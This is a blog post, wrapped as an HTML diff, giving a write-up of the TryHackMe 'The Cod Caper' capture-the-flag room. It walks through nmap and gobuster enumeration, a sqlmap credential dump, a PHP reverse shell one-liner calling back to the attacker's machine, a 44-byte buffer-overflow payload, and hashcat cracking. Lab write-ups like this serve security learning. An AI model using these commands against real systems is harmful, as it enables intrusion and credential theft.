@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="map[name:Natan]">
+<meta name="description" content="Task 1. Intro This is a write up for &amp;ldquo;The Cod Caper&amp;rdquo; room at Try Hack Me.
+Room&amp;rsquo;s intro note:
+Hello there my name is Pingu. I&#39;ve come here to put in a request to get my fish back! My dad recently banned me from eating fish, as I wasn&#39;t eating my vegetables. He locked all the fish in a chest, and hid the key on my old pc, that he recently repurposed into a server." />
+<meta name="keywords" content="DCPT,Pentest,CTF,Cybersecurity,RedTeam,TryhackMe,Hackthebox,certification, tryhackme, writeup, pentest, security, pwn, pwntools, reversingshell, THM, CTF" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://nmmorette.github.io/posts/2021/07/tryhackme-the-cod-caper-write-up/" />
+
+
+    <title>
+        
+            TryHackme - The Cod Caper - Write Up :: Natan Maia Morette 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d1b7875ffcc6236739935f87458d18744077b2f4bb0ba69d0606bc2e1dda197c.css">
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#1b1c1d">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="#1b1c1d">
+    <meta name="theme-color" content="#1b1c1d">
+
+
+
+<meta itemprop="name" content="TryHackme - The Cod Caper - Write Up">
+<meta itemprop="description" content="Task 1. Intro This is a write up for &ldquo;The Cod Caper&rdquo; room at Try Hack Me.
+Room&rsquo;s intro note:
+Hello there my name is Pingu. I&#39;ve come here to put in a request to get my fish back! My dad recently banned me from eating fish, as I wasn&#39;t eating my vegetables. He locked all the fish in a chest, and hid the key on my old pc, that he recently repurposed into a server."><meta itemprop="datePublished" content="2021-07-01T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2021-07-01T00:00:00+00:00" />
+<meta itemprop="wordCount" content="1389"><meta itemprop="image" content="https://nmmorette.github.io"/>
+<meta itemprop="keywords" content="tryhackme,writeup,pentest,security,pwn,pwntools,reversingshell,THM,CTF," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://nmmorette.github.io"/>
+
+<meta name="twitter:title" content="TryHackme - The Cod Caper - Write Up"/>
+<meta name="twitter:description" content="Task 1. Intro This is a write up for &ldquo;The Cod Caper&rdquo; room at Try Hack Me.
+Room&rsquo;s intro note:
+Hello there my name is Pingu. I&#39;ve come here to put in a request to get my fish back! My dad recently banned me from eating fish, as I wasn&#39;t eating my vegetables. He locked all the fish in a chest, and hid the key on my old pc, that he recently repurposed into a server."/>
+
+
+
+
+    <meta property="og:title" content="TryHackme - The Cod Caper - Write Up" />
+<meta property="og:description" content="Task 1. Intro This is a write up for &ldquo;The Cod Caper&rdquo; room at Try Hack Me.
+Room&rsquo;s intro note:
+Hello there my name is Pingu. I&#39;ve come here to put in a request to get my fish back! My dad recently banned me from eating fish, as I wasn&#39;t eating my vegetables. He locked all the fish in a chest, and hid the key on my old pc, that he recently repurposed into a server." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://nmmorette.github.io/posts/2021/07/tryhackme-the-cod-caper-write-up/" /><meta property="og:image" content="https://nmmorette.github.io"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-07-01T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-07-01T00:00:00+00:00" />
+<meta property="og:see_also" content="https://nmmorette.github.io/posts/2023/11/tryhackme-rootme-write-up/" /><meta property="og:see_also" content="https://nmmorette.github.io/posts/2023/10/hack-the-box-keeper-write-up/" /><meta property="og:see_also" content="https://nmmorette.github.io/posts/2023/03/hack-the-box-precious-write-up/" /><meta property="og:see_also" content="https://nmmorette.github.io/posts/2022/08/tryhackme-ohsint-write-up/" /><meta property="og:see_also" content="https://nmmorette.github.io/posts/2022/08/tryhackme-blue-write-up/" /><meta property="og:see_also" content="https://nmmorette.github.io/posts/2022/06/hack-the-box-forest-write-up/" />
+<meta property="og:see_also" content="https://nmmorette.github.io/posts/2023/11/tryhackme-rootme-write-up/" /><meta property="og:see_also" content="https://nmmorette.github.io/posts/2022/08/tryhackme-ohsint-write-up/" /><meta property="og:see_also" content="https://nmmorette.github.io/posts/2022/08/tryhackme-blue-write-up/" /><meta property="og:see_also" content="https://nmmorette.github.io/posts/2021/08/tryhackme-bounty-hacker-write-up/" /><meta property="og:see_also" content="https://nmmorette.github.io/posts/2021/07/tryhackme-steel-mountain-write-up/" />
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2021-07-01 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-G8KSXL5JBP"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-G8KSXL5JBP', { 'anonymize_ip': false });
+}
+</script>
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text">$ cd /home/nmmorette</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#298a29;
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/whoami/">$whoami</a></li><li><a href="/badges/">Badges</a></li><li><a href="/posts/">Posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        7 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://nmmorette.github.io/posts/2021/07/tryhackme-the-cod-caper-write-up/">TryHackme - The Cod Caper - Write Up</a>
+      </h1>
+
+      
+
+      
+
+      
+
+      <div class="post-content">
+        
+    <img src="/images/thecodcaper/novo.jpg"  class="center"  style="border-radius: 10px;"  />
+
+
+<h2 id="task-1-intro">Task 1. Intro</h2>
+<p>This is a write up for &ldquo;The Cod Caper&rdquo; <a href="https://tryhackme.com/room/thecodcaper" target="_blank" >room</a> at Try Hack Me.</p>
+<p>Room&rsquo;s intro note:</p>
+
+
+
+<blockquote>
+
+Hello there my name is Pingu. I've come here to put in a request to get my fish back! My dad recently banned me from eating fish, as I wasn't eating my vegetables. He locked all the fish in a chest, and hid the key on my old pc, that he recently repurposed into a server. As all penguins are natural experts in penetration testing, I figured I could get the key myself! Unfortunately he banned every IP from Antarctica, so I am unable to do anything to the server. Therefore I call upon you my dear ally to help me get my fish back! Naturally I'll be guiding you through the process.
+</blockquote>
+
+<h2 id="task-2-host-enumeration">Task 2. Host Enumeration</h2>
+<p>First of all let&rsquo;s <code>nmap</code> the machine IP.</p>
+<p>We&rsquo;re going to scan port 1 to 1000 as suggested in the task.</p>
+<pre tabindex="0"><code class="language-cli" data-lang="cli"> nmap -v -A -sC -p 1-100  10.10.41.158
+</code></pre><p>Flags used:</p>
+<p><code>-p 1–1000”</code> = Used to specify which port to analyze, can also be used to specify a range of ports.</p>
+<p><code>-sC</code> = Runs default scripts on the port, useful for doing basic analysis on the service running on a port.</p>
+<p><code>-A</code> = Aggressive mode, go all out and try to get as much information as possible.</p>
+<p>We found 2 open ports, just pay attention to the nmap results, all answers for the first task are there.</p>
+<h2 id="task-3-web-enumeration">Task 3. Web Enumeration</h2>
+<p>Let&rsquo;s search for files and directories.</p>
+<p>You may use <code>gobuster</code> for that, but I would particularly go with my bash script. You can download my script <a href="http:/https://github.com/nmmorette/bash-scripts/blob/25f02fa424136f0d23090072a773892e19c5c5b2/webrecon.sh/" target="_blank" >here</a>
+Edit the file with a wordlist of your preference. I suggest the big.txt from <code>dirb</code>.</p>
+<p>Execute the <code>.\webrecon.sh</code> script in the target:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">  .<span style="color:#ae81ff">\w</span>ebrecon.sh TARGET_IP
+</code></pre></div><p>If you like to use use <code>gobuster</code>:</p>
+<pre tabindex="0"><code class="language-cli" data-lang="cli">  gobuster dir --url TARGET_IP --wordlist /usr/share/wordlists/dirb/big.txt -x &quot;php,txt,html&quot; | grep 200
+</code></pre><p>The  <code>| grep 200</code> is for filter the results only for http 200 code.</p>
+
+    <img src="/images/thecodcaper/gobuster.JPG"  class="center"  style="border-radius: 5px;"  />
+
+
+<p>Both modes will lead us to a <code>.php</code> file with an &ldquo;Administrator Login&rdquo; web page.</p>
+
+    <img src="/images/thecodcaper/admin.JPG"  class="center"  style="border-radius: 8px;"  />
+
+
+<h2 id="task-4-web-exploitation">Task 4. Web Exploitation</h2>
+<p>Now we have an administrator page but we don&rsquo;t have credentials to log in. So let&rsquo;s try some SQL injection using the  <code>sqlmap</code>.</p>
+
+    <img src="/images/thecodcaper/sql.jpg"  class="center"  style="border-radius: 8px;"  />
+
+
+<pre tabindex="0"><code class="language-cli" data-lang="cli">  sqlmap -u http://10.10.41.158/administrator.php --forms --dump
+</code></pre><p>Flags used:</p>
+<p><code>-u</code> = Specifies which url to attack.</p>
+<p><code>--forms</code> = Automatically selects parameters from <!-- raw HTML omitted --> elements on the page.</p>
+<p><code>--dump</code> = Used to retrieve data from the db once SQLI is found.</p>
+<p>As result we got a username and a pass:</p>
+
+    <img src="/images/thecodcaper/cred.jpg"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Finally we can login into <code>/administrator.php</code> page then we get a &ldquo;Run Command&rdquo; page:</p>
+
+    <img src="/images/thecodcaper/run.jpg"  class="center"  style="border-radius: 8px;"  />
+
+
+<h2 id="task-5-command-execution">Task 5. Command Execution</h2>
+<p>Since we have a form to run commands, let&rsquo;s run some basic command as <code>ls</code></p>
+<p>It&rsquo;s working!! 
+We have the result:</p>
+
+    <img src="/images/thecodcaper/files.jpg"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>That command give us the answer for the first question in the task</p>
+<p>With the ability to run commands we should try some reverse shell.
+We know that server uses <code>php</code> then let&rsquo;s try a <code>php</code> reverse shell on it.
+This is one way, but feel free to try another kind of reverse shell: python or nc.
+Net Cat will probably works too, since the intro of that particular task told us that the server has nc enable.</p>
+<p>We need to open a port in our machine:</p>
+<pre tabindex="0"><code class="language-cli" data-lang="cli">nc -vnlp 12345
+</code></pre><p>Php reverse shell sintax:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">  <span style="color:#a6e22e">php</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">r</span> <span style="color:#e6db74">&#39;$sock=fsockopen(&#34;OUR_MACHINE_IP&#34;,PORT);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
+</code></pre></div><p>Edit the command above with the your machine ip and port, then copy and past to &ldquo;Run Command&rdquo; web page</p>
+<p>Now we have a shell in the atacked machine we need a little bit of enumeration. Since we know that user  and we need to find more information about the users.</p>
+<p>Lets check the <code>/home</code> directory:</p>
+
+    <img src="/images/thecodcaper/home.jpg"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>We also can check in the <code>/etc/passwd</code>:</p>
+
+    <img src="/images/thecodcaper/passwd.jpg"  class="center"  style="border-radius:15px;"  />
+
+
+<p>After this, you will have to do some additional enumeration to find user&rsquo;s ssh key, or hidden password</p>
+<p>We can check all files from the user with the command:</p>
+<pre tabindex="0"><code class="language-cli" data-lang="cli">  find / -user pingu -print 2&gt;/dev/null
+</code></pre><p>Also we can search for file names like: pass, secret, private etc&hellip;.</p>
+<pre tabindex="0"><code class="language-cli" data-lang="cli">    find / -name pass* 2&gt;/dev/null
+</code></pre><p>Take a good look at the results and find the file with user&rsquo;s password. 
+You can also search for a <code>ssh</code> key file.</p>
+<h2 id="task-6-linenum">Task 6. LinEnum</h2>
+<p>We have a user/pass then we should <code>ssh</code> the machine.</p>
+
+    <img src="/images/thecodcaper/ssh.jpg"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>We&rsquo;re logged in the user machine, however we need to find possibles ways to priv esc. Let&rsquo;s go with LinEnum.</p>
+
+
+<blockquote>
+LinEnum is a bash script that searches for possible ways to priv esc. It is incredibly popular due to the sheer amount of possible methods that it checks for, and often times Linenum is one of the first things to try when you get shell access.
+
+</blockquote>
+
+
+<p>Let&rsquo;s copy the <a href="https://github.com/rebootuser/LinEnum" target="_blank" >Linenum</a> scritp:</p>
+<pre tabindex="0"><code class="language-cli" data-lang="cli"> scp {path to linenum} {user}@{host}:{path}
+</code></pre><p>After that, run <code>linenum.sh</code></p>
+<p>Go to SUID files section and find the answer to task 6 only question.</p>
+
+    <img src="/images/thecodcaper/su.JPG"  class="center"  style="border-radius: 8px;"  />
+
+
+<h2 id="task-7-pwndbg">Task 7. pwndbg</h2>
+<p>We found an interesting file in the step above, moreover as explained in Tryhackme,this file expects 32 characters in the input now we used <code>gdb</code> to analyze.</p>
+<pre tabindex="0"><code class="language-cli" data-lang="cli">   gdb /opt/secret/root
+</code></pre>
+    <img src="/images/thecodcaper/gbd.jpg"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>The <code>pwndbg</code> has successfully been initialized. The next phase is to test if anything happens when we send more then 32 characters.</p>
+<p>Type:</p>
+<pre tabindex="0"><code class="language-pwndbg" data-lang="pwndbg">  r &lt; &lt;(cyclic 50)
+</code></pre><p>That command runs the program and provides 50 characters worth of &ldquo;cyclic&rdquo; input.
+After running this command you will see something like this:</p>
+<p>
+    <img src="/images/thecodcaper/secret.jpg"  class="center"  style="border-radius: 8px;"  />
+
+
+
+
+<blockquote>
+Now this is where some knowledge of assembly helps. It seems that in this case we're able to overwrite EIP, which is known as the instruction pointer. The instruction pointer tells the program which bit of memory to execute next, which in an ideal case would have the program run normally. However, since we're able to overwrite it, we can theoretically execute any part of the program at any time.*
+
+*Recall the shell function from the source code, if we can overwrite EIP to point to the shell function, we can cause it to execute. This is also where the benefits of cyclic input show themselves. Recall that cyclic input goes in 4 character/byte sequences, meaning we're able to calculate exactly how many characters we need to provide before we can overwrite EIP.
+</blockquote>
+
+Luckily cyclic provides this functionality with the -l flag, running <code>cyclic -l {fault address}</code> will tell us exactly how many characters we need to provide we can overwrite EIP.&quot;</p>
+<p>Running:</p>
+<pre tabindex="0"><code class="language-pwndbg" data-lang="pwndbg">     cyclic -l 0x6161616c 
+</code></pre><p>Outputs 44, meaning we can overwrite EIP once we provide 44 characters of input.</p>
+<p>That&rsquo;s all we needed for pre-explotation!</p>
+<h2 id="task-8-binary-exploitation-manually--9-the-pwntools-way">Task 8. Binary-Exploitation: Manually | 9. The pwntools way</h2>
+<p>These two steps lead us to the same result, we&rsquo;re going with step 8 pass in this write up, but feel free to try the pwntools way.</p>
+
+
+<blockquote>
+Previously we figured out that we need to provide 44 characters of input, and then we can execute whatever part of the program we want. Now the next step is to find out exactly where the shell function is in memory so we know what to set EIP to. GDB supports this as well with the disassemble command. Type disassemble shell, and this should pop up
+</blockquote>
+
+<pre tabindex="0"><code class="language-pwndbg" data-lang="pwndbg">        disassemble shell 
+</code></pre>
+
+<blockquote>
+What we're interested in is the hex memory addresses. So from what we know all we have to do is provide 44 characters, and then "0x080484cb" and the shell function should execute, let's try it!
+</blockquote>
+
+<p>We can use python to do this:</p>
+<p>Python conversion:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">     python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;print &#34;A&#34;*44 + &#34;</span><span style="color:#ae81ff">\xcb\x84\x04\x08</span><span style="color:#e6db74">&#34;</span>
+</code></pre></div>
+
+<blockquote>
+
+The command above  will output the payload we want, but it requires manually converting to little endian.
+We print 44 random characters(in this case A) and then our memory address in little endian, and shell should execute. This can be tested by piping the output in to the binary*
+
+</blockquote>
+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">      python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;print &#34;A&#34;*44 + &#34;</span><span style="color:#ae81ff">\xcb\x84\x04\x08</span><span style="color:#e6db74">&#34;&#39;</span> <span style="color:#f92672">|</span> <span style="color:#f92672">/</span>opt<span style="color:#f92672">/</span>secret<span style="color:#f92672">/</span>root
+</code></pre></div><p>Save the hash!</p>
+<h2 id="task-10-finish-the-job">Task 10. Finish the job</h2>
+<p>Finally the last task. For this last one we need two things:</p>
+
+
+<ul>
+<li>The hash that we found in last task </li>
+<li>A little bit of patience</li>
+
+<p>Luckily hashcat supports cracking linux password hashes. You can find a list of hashcat modes <a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank" >here</a> and <a href="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt" target="_blank" >rockyou</a>(a popular wordlist) here (if you don&rsquo;t already have it on your system yet)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"> hashcat -m <span style="color:#ae81ff">1800</span> -a <span style="color:#ae81ff">0</span> pingu.hash /usr/share/wordlists/rockyou.txt
+</code></pre></div>
+    <img src="/images/thecodcaper/5.gif"  class="center"  style="border-radius: 3px;"  />
+
+
+<p>Flags:</p>
+<p><code>-a</code> = Specify attack mode,attack modes can be found in the man page.</p>
+<p><code>-m</code> = Specifies which mode to use, refer back to the list of modes</p>
+
+    <img src="/images/thecodcaper/finalpass.jpg"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>We did it!</p>
+
+
+<blockquote>
+
+THM suggestion reading:
+</blockquote>
+
+<p><a href="http://docs.pwntools.com/en/stable/" target="_blank" >http://docs.pwntools.com/en/stable/</a></p>
+<p><a href="https://browserpwndbg.readthedocs.io/en/docs/" target="_blank" >https://browserpwndbg.readthedocs.io/en/docs/</a></p>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://nmmorette.github.io/tags/tryhackme/">tryhackme</a></span>
+        <span class="tag"><a href="https://nmmorette.github.io/tags/writeup/">writeup</a></span>
+        <span class="tag"><a href="https://nmmorette.github.io/tags/pentest/">pentest</a></span>
+        <span class="tag"><a href="https://nmmorette.github.io/tags/security/">security</a></span>
+        <span class="tag"><a href="https://nmmorette.github.io/tags/pwn/">pwn</a></span>
+        <span class="tag"><a href="https://nmmorette.github.io/tags/pwntools/">pwntools</a></span>
+        <span class="tag"><a href="https://nmmorette.github.io/tags/reversingshell/">reversingshell</a></span>
+        <span class="tag"><a href="https://nmmorette.github.io/tags/thm/">THM</a></span>
+        <span class="tag"><a href="https://nmmorette.github.io/tags/ctf/">CTF</a></span>
+        
+    </p>
+
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        1389 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2021-06-30 21:00
+        
+
+         
+          
+        
+      </p>
+    </div>
+      <hr />
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fnmmorette.github.io%2fposts%2f2021%2f07%2ftryhackme-the-cod-caper-write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fnmmorette.github.io%2fposts%2f2021%2f07%2ftryhackme-the-cod-caper-write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=TryHackme%20-%20The%20Cod%20Caper%20-%20Write%20Up&amp;caption=TryHackme%20-%20The%20Cod%20Caper%20-%20Write%20Up&amp;canonicalUrl=https%3a%2f%2fnmmorette.github.io%2fposts%2f2021%2f07%2ftryhackme-the-cod-caper-write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=TryHackme%20-%20The%20Cod%20Caper%20-%20Write%20Up&amp;body=https%3a%2f%2fnmmorette.github.io%2fposts%2f2021%2f07%2ftryhackme-the-cod-caper-write-up%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fnmmorette.github.io%2fposts%2f2021%2f07%2ftryhackme-the-cod-caper-write-up%2f&amp;media=https%3a%2f%2fnmmorette.github.io%2fposts%2f2021%2f07%2ftryhackme-the-cod-caper-write-up%2f;description=TryHackme%20-%20The%20Cod%20Caper%20-%20Write%20Up" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fnmmorette.github.io%2fposts%2f2021%2f07%2ftryhackme-the-cod-caper-write-up%2f&amp;title=TryHackme%20-%20The%20Cod%20Caper%20-%20Write%20Up&amp;summary=TryHackme%20-%20The%20Cod%20Caper%20-%20Write%20Up&amp;source=https%3a%2f%2fnmmorette.github.io%2fposts%2f2021%2f07%2ftryhackme-the-cod-caper-write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fnmmorette.github.io%2fposts%2f2021%2f07%2ftryhackme-the-cod-caper-write-up%2f&amp;resubmit=true&amp;title=TryHackme%20-%20The%20Cod%20Caper%20-%20Write%20Up" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
